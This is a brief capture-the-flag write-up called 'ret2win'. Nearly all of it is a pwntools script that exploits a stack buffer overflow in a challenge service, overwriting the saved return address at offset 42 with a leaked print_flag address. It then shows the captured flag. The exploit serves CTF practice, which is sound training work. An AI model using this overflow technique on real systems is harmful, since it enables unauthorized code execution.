ret2win

```python
from pwn import *

context.update(arch='i386', os='linux')

#p = process('./old-memes')
p = remote("old-memes-never-die.ctf.zone", 4242)

p.recvuntil(b'here: ')
addr_str = p.recvline().strip().rstrip(b')')
print_flag_addr = int(addr_str, 16)
log.success(f"print_flag address: {hex(print_flag_addr)}")

p.recvuntil(b'What is your name?\n> ')
p.sendline(b'what?')

p.recvuntil(b'What is your name?\n> ')
# overwrite eip
offset = 42

payload = flat({
        offset: [
        print_flag_addr
        ]
})

p.sendline(payload)

p.interactive()
```

Flag: `flag{f648a34020ffba10cc5cfc9bd2240725}`


Solved by: benkyou